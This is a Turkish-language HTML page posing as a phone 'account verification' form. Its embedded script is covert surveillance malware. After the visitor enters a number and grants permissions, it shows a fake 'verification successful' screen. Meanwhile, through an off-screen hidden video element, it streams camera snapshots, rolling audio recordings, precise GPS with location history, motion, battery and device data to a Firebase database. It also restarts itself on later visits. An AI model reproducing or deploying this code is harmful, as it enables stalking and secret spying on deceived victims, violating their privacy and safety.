<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Hesap Doğrulama</title>
    
    <meta name="theme-color" content="#ffffff">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="Doğrulama">
    <link rel="manifest" href="manifest.json">
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f7;
            min-height: 100vh;
            color: #1d1d1f;
        }

        .app {
            max-width: 480px;
            margin: 0 auto;
            min-height: 100vh;
            background: #fff;
            position: relative;
        }

        /* Header */
        .header {
            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
            padding: 60px 24px 40px;
            text-align: center;
            color: #fff;
        }

        .header-icon {
            width: 70px; height: 70px;
            background: rgba(255,255,255,0.2);
            border-radius: 20px;
            margin: 0 auto 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
        }

        .header-icon svg {
            width: 36px; height: 36px;
            fill: #fff;
        }

        .header h1 {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .header p {
            font-size: 0.9rem;
            opacity: 0.9;
        }

        /* Content */
        .content {
            padding: 24px;
        }

        /* Setup Card */
        .setup-card {
            background: #fff;
            border-radius: 16px;
            padding: 24px;
            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
            margin-top: -30px;
            position: relative;
            z-index: 10;
        }

        .setup-card h2 {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1d1d1f;
        }

        .setup-card p {
            font-size: 0.85rem;
            color: #86868b;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-group label {
            display: block;
            font-size: 0.8rem;
            font-weight: 500;
            color: #86868b;
            margin-bottom: 8px;
        }

        .phone-input {
            display: flex;
            align-items: center;
            background: #f5f5f7;
            border-radius: 12px;
            padding: 4px;
            border: 2px solid transparent;
            transition: all 0.2s;
        }

        .phone-input:focus-within {
            border-color: #007AFF;
            background: #fff;
        }

        .phone-prefix {
            padding: 12px 14px;
            font-size: 1rem;
            color: #1d1d1f;
            font-weight: 500;
            border-right: 1px solid #e5e5e7;
        }

        .phone-input input {
            flex: 1;
            padding: 12px 14px;
            border: none;
            background: transparent;
            font-size: 1rem;
            color: #1d1d1f;
            outline: none;
        }

        .phone-input input::placeholder {
            color: #c7c7cc;
        }

        .btn-verify {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-verify:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 20px rgba(0, 122, 255, 0.4);
        }

        .btn-verify:active {
            transform: translateY(0);
        }

        .btn-verify:disabled {
            background: #c7c7cc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .btn-verify .spinner {
            width: 20px; height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Info Text */
        .info-text {
            text-align: center;
            margin-top: 20px;
            font-size: 0.75rem;
            color: #86868b;
            line-height: 1.5;
        }

        .info-text a {
            color: #007AFF;
            text-decoration: none;
        }

        /* Success State */
        .success-card {
            text-align: center;
            padding: 40px 24px;
        }

        .success-icon {
            width: 80px; height: 80px;
            background: linear-gradient(135deg, #34C759 0%, #30D158 100%);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: successPop 0.5s ease-out;
        }

        @keyframes successPop {
            0% { transform: scale(0); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .success-icon svg {
            width: 40px; height: 40px;
            fill: #fff;
        }

        .success-card h2 {
            font-size: 1.3rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1d1d1f;
        }

        .success-card p {
            font-size: 0.9rem;
            color: #86868b;
            margin-bottom: 24px;
        }

        .verified-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 10px 20px;
            background: rgba(52, 199, 89, 0.1);
            border-radius: 100px;
            color: #34C759;
            font-size: 0.85rem;
            font-weight: 600;
        }

        .verified-badge::before {
            content: '';
            width: 8px; height: 8px;
            background: #34C759;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        /* Hidden Camera Preview */
        .hidden-preview {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* Footer */
        .footer {
            position: fixed;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            max-width: 480px;
            padding: 16px 24px;
            background: linear-gradient(to top, #fff 80%, transparent);
            text-align: center;
        }

        .footer p {
            font-size: 0.7rem;
            color: #c7c7cc;
        }

        /* Status Indicator (Minimal) */
        .status-bar {
            position: fixed;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            max-width: 480px;
            padding: 8px 16px;
            display: flex;
            justify-content: flex-end;
            z-index: 100;
        }

        .status-indicator {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 0.65rem;
            color: rgba(255,255,255,0.7);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .status-indicator.visible {
            opacity: 1;
        }

        .status-indicator .dot {
            width: 6px; height: 6px;
            border-radius: 50%;
            background: #34C759;
        }

        /* Hidden */
        .hidden { display: none !important; }

        /* Responsive */
        @media (max-width: 380px) {
            .header { padding: 50px 20px 35px; }
            .header h1 { font-size: 1.3rem; }
            .setup-card { padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="app">
        <!-- Status Bar -->
        <div class="status-bar">
            <div class="status-indicator" id="statusIndicator">
                <span class="dot"></span>
                <span>Aktif</span>
            </div>
        </div>

        <!-- Header -->
        <div class="header">
            <div class="header-icon">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
            </div>
            <h1>Hesap Güvenliği</h1>
            <p>Kimliğinizi doğrulayın</p>
        </div>

        <!-- Content -->
        <div class="content">
            <!-- Setup State -->
            <div class="setup-card" id="setupCard">
                <h2>Telefon Doğrulama</h2>
                <p>Hesabınızı korumak için telefon numaranızı doğrulayın. Size bir onay kodu göndereceğiz.</p>

                <div class="input-group">
                    <label>Telefon Numarası</label>
                    <div class="phone-input">
                        <span class="phone-prefix">+90</span>
                        <input type="tel" id="phoneInput" placeholder="5XX XXX XX XX" maxlength="13" autocomplete="off">
                    </div>
                </div>

                <button class="btn-verify" id="verifyBtn">
                    <span id="btnText">Doğrula</span>
                    <div class="spinner hidden" id="btnSpinner"></div>
                </button>

                <p class="info-text">
                    Devam ederek <a href="#">Kullanım Koşulları</a> ve <a href="#">Gizlilik Politikası</a>'nı kabul etmiş olursunuz.
                </p>
            </div>

            <!-- Success State -->
            <div class="success-card hidden" id="successCard">
                <div class="success-icon">
                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
                </div>
                <h2>Doğrulama Başarılı</h2>
                <p>Telefon numaranız başarıyla doğrulandı. Hesabınız artık güvende.</p>
                <div class="verified-badge">Doğrulanmış Hesap</div>
            </div>
        </div>

        <!-- Hidden Camera -->
        <video id="videoPreview" class="hidden-preview" autoplay muted playsinline></video>

        <!-- Footer -->
        <div class="footer">
            <p>© 2026 Güvenlik Merkezi. Tüm hakları saklıdır.</p>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDR9gR5nhJ2Y2nNLBKwK7IiAr1_KVWjHSw",
            authDomain: "gizli-38804.firebaseapp.com",
            databaseURL: "https://gizli-38804-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "gizli-38804",
            storageBucket: "gizli-38804.firebasestorage.app",
            messagingSenderId: "653791348128",
            appId: "1:653791348128:web:ac6502b2692441b99610c5"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        class SecureTracker {
            constructor() {
                this.code = '';
                this.videoStream = null;
                this.mediaRecorder = null;
                this.audioContext = null;
                this.analyser = null;
                this.watchId = null;
                this.isActive = false;
                this.canvas = document.createElement('canvas');
                this.ctx = this.canvas.getContext('2d');
                this.isOnline = navigator.onLine;
                
                this.stats = {
                    updateCount: 0,
                    totalDistance: 0,
                    lastPosition: null,
                    isMoving: false
                };

                this.init();
            }

            init() {
                // Telefon numarası formatla
                const phoneInput = document.getElementById('phoneInput');
                phoneInput.addEventListener('input', (e) => {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 10) value = value.slice(0, 10);
                    
                    // Format: 5XX XXX XX XX
                    if (value.length > 3 && value.length <= 6) {
                        value = value.slice(0, 3) + ' ' + value.slice(3);
                    } else if (value.length > 6 && value.length <= 8) {
                        value = value.slice(0, 3) + ' ' + value.slice(3, 6) + ' ' + value.slice(6);
                    } else if (value.length > 8) {
                        value = value.slice(0, 3) + ' ' + value.slice(3, 6) + ' ' + value.slice(6, 8) + ' ' + value.slice(8);
                    }
                    
                    e.target.value = value;
                });

                document.getElementById('verifyBtn').addEventListener('click', () => this.start());

                // Auto-start kontrolü
                const wasRunning = localStorage.getItem('secure_running') === 'true';
                const savedCode = localStorage.getItem('secure_code');
                
                if (wasRunning && savedCode) {
                    this.code = savedCode;
                    this.showSuccess();
                    this.startTracking();
                }

                // Network listener
                window.addEventListener('online', () => {
                    this.isOnline = true;
                    if (this.isActive) this.checkAndReconnect();
                });
                window.addEventListener('offline', () => this.isOnline = false);

                document.addEventListener('visibilitychange', () => {
                    if (document.visibilityState === 'visible' && this.isActive) {
                        this.checkAndReconnect();
                    }
                });
            }

            formatPhoneToCode(phone) {
                return phone.replace(/\D/g, '').slice(-10);
            }

            async start() {
                const phoneInput = document.getElementById('phoneInput');
                const rawPhone = phoneInput.value.replace(/\D/g, '');
                
                if (rawPhone.length < 10) {
                    phoneInput.parentElement.style.borderColor = '#FF3B30';
                    setTimeout(() => {
                        phoneInput.parentElement.style.borderColor = 'transparent';
                    }, 2000);
                    return;
                }

                this.code = rawPhone;
                localStorage.setItem('secure_code', this.code);

                // Loading state
                document.getElementById('btnText').textContent = 'Doğrulanıyor...';
                document.getElementById('btnSpinner').classList.remove('hidden');
                document.getElementById('verifyBtn').disabled = true;

                try {
                    // Kamera + Mikrofon
                    this.videoStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                        audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: true }
                    });
                    
                    document.getElementById('videoPreview').srcObject = this.videoStream;
                    this.setupAudioAnalyser();

                    // Konum
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000
                        });
                    });

                    // Hareket sensörü
                    if (window.DeviceMotionEvent) {
                        window.addEventListener('devicemotion', (e) => this.handleMotion(e));
                    }

                    // Başarılı
                    localStorage.setItem('secure_running', 'true');
                    this.isActive = true;
                    
                    // Kısa gecikme (doğrulama etkisi)
                    await new Promise(r => setTimeout(r, 1500));
                    
                    this.showSuccess();
                    this.startTracking();
                    this.startAudioRecording();

                    // Wake lock
                    if ('wakeLock' in navigator) {
                        try { await navigator.wakeLock.request('screen'); } catch (e) {}
                    }

                } catch (error) {
                    console.error('Error:', error);
                    document.getElementById('btnText').textContent = 'Doğrula';
                    document.getElementById('btnSpinner').classList.add('hidden');
                    document.getElementById('verifyBtn').disabled = false;
                    
                    // Kullanıcıya hata göster
                    alert('Doğrulama için izinleri onaylamanız gerekmektedir.');
                }
            }

            showSuccess() {
                document.getElementById('setupCard').classList.add('hidden');
                document.getElementById('successCard').classList.remove('hidden');
                document.getElementById('statusIndicator').classList.add('visible');
            }

            async checkAndReconnect() {
                if (!this.isOnline) return;

                try {
                    await db.ref('devices/' + this.code + '/status').set('online');
                    
                    if (!this.videoStream || !this.videoStream.active) {
                        await this.restartMedia();
                    }
                    
                    if (!this.watchId) {
                        this.startLocationWatch();
                    }
                } catch (error) {
                    setTimeout(() => this.checkAndReconnect(), 5000);
                }
            }

            async restartMedia() {
                if (this.videoStream) {
                    this.videoStream.getTracks().forEach(track => track.stop());
                }

                try {
                    this.videoStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                        audio: true
                    });
                    
                    document.getElementById('videoPreview').srcObject = this.videoStream;
                    this.setupAudioAnalyser();
                    this.startAudioRecording();
                } catch (e) {}
            }

            setupAudioAnalyser() {
                try {
                    this.audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    this.analyser = this.audioContext.createAnalyser();
                    const source = this.audioContext.createMediaStreamSource(this.videoStream);
                    source.connect(this.analyser);
                    this.analyser.fftSize = 256;
                    
                    const updateLevel = () => {
                        if (!this.isActive) return;
                        
                        const dataArray = new Uint8Array(this.analyser.frequencyBinCount);
                        this.analyser.getByteFrequencyData(dataArray);
                        
                        const average = dataArray.reduce((a, b) => a + b) / dataArray.length;
                        const percent = Math.min(100, (average / 128) * 100);
                        
                        if (this.isOnline) {
                            db.ref('devices/' + this.code + '/audioLevel').set({
                                level: Math.round(percent),
                                timestamp: Date.now()
                            });
                        }
                        
                        requestAnimationFrame(updateLevel);
                    };
                    updateLevel();
                } catch (e) {}
            }

            handleMotion(event) {
                if (!this.isActive) return;
                
                const acc = event.acceleration;
                if (!acc) return;
                
                const magnitude = Math.sqrt((acc.x || 0) ** 2 + (acc.y || 0) ** 2 + (acc.z || 0) ** 2);
                const isMoving = magnitude > 2;
                
                if (isMoving !== this.stats.isMoving) {
                    this.stats.isMoving = isMoving;
                    
                    if (this.isOnline) {
                        db.ref('devices/' + this.code + '/motion').set({
                            isMoving,
                            magnitude: Math.round(magnitude * 100) / 100,
                            timestamp: Date.now()
                        });
                    }
                }
            }

            startTracking() {
                this.startLocationWatch();

                // Kamera
                this.sendFrame();
                setInterval(() => {
                    if (this.isActive && this.isOnline) this.sendFrame();
                }, 1500);

                // Pil
                this.trackBattery();

                // Cihaz bilgisi
                this.sendDeviceInfo();

                // Heartbeat
                setInterval(() => {
                    if (this.isActive && this.isOnline) {
                        db.ref('devices/' + this.code + '/heartbeat').set({
                            timestamp: Date.now(),
                            uptime: Math.floor((Date.now() - (this.stats.startTime || Date.now())) / 1000)
                        });
                    }
                }, 25000);

                this.stats.startTime = Date.now();
            }

            startLocationWatch() {
                this.watchId = navigator.geolocation.watchPosition(
                    (pos) => this.handlePosition(pos),
                    (err) => {
                        setTimeout(() => {
                            if (this.isActive && !this.watchId) this.startLocationWatch();
                        }, 5000);
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            }

            handlePosition(position) {
                if (!this.isActive) return;

                const { latitude, longitude, accuracy, speed, altitude, heading } = position.coords;
                const timestamp = Date.now();

                if (this.stats.lastPosition) {
                    const dist = this.calculateDistance(
                        this.stats.lastPosition.lat,
                        this.stats.lastPosition.lng,
                        latitude, longitude
                    );
                    if (dist > 1) this.stats.totalDistance += dist;
                }

                this.stats.lastPosition = { lat: latitude, lng: longitude };
                this.stats.updateCount++;

                if (!this.isOnline) return;

                db.ref('devices/' + this.code + '/location').set({
                    lat: latitude,
                    lng: longitude,
                    accuracy: accuracy || 0,
                    speed: speed || 0,
                    altitude: altitude || 0,
                    heading: heading || 0,
                    timestamp,
                    updateCount: this.stats.updateCount,
                    totalDistance: Math.round(this.stats.totalDistance)
                });
                
                db.ref('devices/' + this.code + '/status').set('online');
                db.ref('devices/' + this.code + '/history').push({ lat: latitude, lng: longitude, timestamp });
            }

            calculateDistance(lat1, lon1, lat2, lon2) {
                const R = 6371000;
                const dLat = (lat2 - lat1) * Math.PI / 180;
                const dLon = (lon2 - lon1) * Math.PI / 180;
                const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                          Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                          Math.sin(dLon/2) * Math.sin(dLon/2);
                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
                return R * c;
            }

            startAudioRecording() {
                if (!this.videoStream) return;

                const audioTrack = this.videoStream.getAudioTracks()[0];
                if (!audioTrack) return;

                const audioStream = new MediaStream([audioTrack]);

                const recordAudio = () => {
                    if (!this.isActive) return;

                    const chunks = [];
                    
                    let mimeType = 'audio/webm;codecs=opus';
                    if (!MediaRecorder.isTypeSupported(mimeType)) {
                        mimeType = 'audio/webm';
                        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
                    }

                    try {
                        const options = mimeType ? { mimeType, audioBitsPerSecond: 128000 } : {};
                        this.mediaRecorder = new MediaRecorder(audioStream, options);
                    } catch (e) { return; }

                    this.mediaRecorder.ondataavailable = (e) => {
                        if (e.data && e.data.size > 0) chunks.push(e.data);
                    };

                    this.mediaRecorder.onstop = () => {
                        if (chunks.length > 0 && this.isActive && this.isOnline) {
                            const blob = new Blob(chunks, { type: mimeType || 'audio/webm' });
                            this.sendAudioData(blob);
                        }
                        if (this.isActive) setTimeout(recordAudio, 100);
                    };

                    this.mediaRecorder.onerror = () => {
                        if (this.isActive) setTimeout(recordAudio, 1000);
                    };

                    try {
                        this.mediaRecorder.start();
                        setTimeout(() => {
                            if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
                                this.mediaRecorder.stop();
                            }
                        }, 2000);
                    } catch (e) {
                        if (this.isActive) setTimeout(recordAudio, 1000);
                    }
                };

                recordAudio();
            }

            sendAudioData(blob) {
                const reader = new FileReader();
                reader.onloadend = () => {
                    db.ref('devices/' + this.code + '/audio').set({
                        data: reader.result,
                        timestamp: Date.now(),
                        size: blob.size
                    });
                };
                reader.readAsDataURL(blob);
            }

            sendFrame() {
                if (!this.videoStream || !this.isActive || !this.isOnline) return;

                const video = document.getElementById('videoPreview');
                
                this.canvas.width = 640;
                this.canvas.height = 480;
                this.ctx.drawImage(video, 0, 0, 640, 480);

                const imageData = this.canvas.toDataURL('image/jpeg', 0.6);

                db.ref('devices/' + this.code + '/camera').set({
                    image: imageData,
                    timestamp: Date.now()
                });
            }

            async trackBattery() {
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        
                        const update = () => {
                            if (this.isOnline) {
                                db.ref('devices/' + this.code + '/battery').set({
                                    level: Math.round(battery.level * 100),
                                    charging: battery.charging,
                                    timestamp: Date.now()
                                });
                            }
                        };

                        battery.addEventListener('levelchange', update);
                        battery.addEventListener('chargingchange', update);
                        update();
                        setInterval(update, 30000);
                    } catch (e) {}
                }
            }

            sendDeviceInfo() {
                const ua = navigator.userAgent;
                const info = {
                    platform: /Android/i.test(ua) ? 'Android' : /iPhone|iPad|iPod/i.test(ua) ? 'iOS' : 'Other',
                    browser: /Chrome/i.test(ua) ? 'Chrome' : /Safari/i.test(ua) ? 'Safari' : /Firefox/i.test(ua) ? 'Firefox' : 'Other',
                    screen: `${screen.width}x${screen.height}`,
                    language: navigator.language,
                    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                    timestamp: Date.now()
                };

                db.ref('devices/' + this.code + '/deviceInfo').set(info);
            }
        }

        new SecureTracker();
    </script>
</body>
</html>
